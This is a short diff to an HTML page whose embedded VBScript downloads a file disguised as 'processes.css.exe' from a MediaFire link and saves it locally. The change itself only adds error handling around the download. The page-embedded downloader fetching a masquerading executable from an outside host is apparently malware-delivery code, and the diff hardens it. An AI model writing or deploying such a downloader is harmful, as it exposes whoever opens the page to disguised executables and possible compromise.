@@ -33,6 +33,8 @@
         url = "https://www.mediafire.com/file/z9vdxpqhhyfhgtq/processes.css.exe/file"
         filePath = "C:\path\to\save\processes.css.exe"
 
+        On Error Resume Next
+
         Set xhr = CreateObject("MSXML2.XMLHTTP")
         xhr.open "GET", url, False
         xhr.send
@@ -50,6 +52,13 @@
         Else
             MsgBox "Failed to download the file."
         End If
+
+        If Err.Number <> 0 Then
+            MsgBox "An error occurred: " & Err.Description
+            Err.Clear
+        End If
+
+        On Error GoTo 0
     </script>
 </body>
 </html>
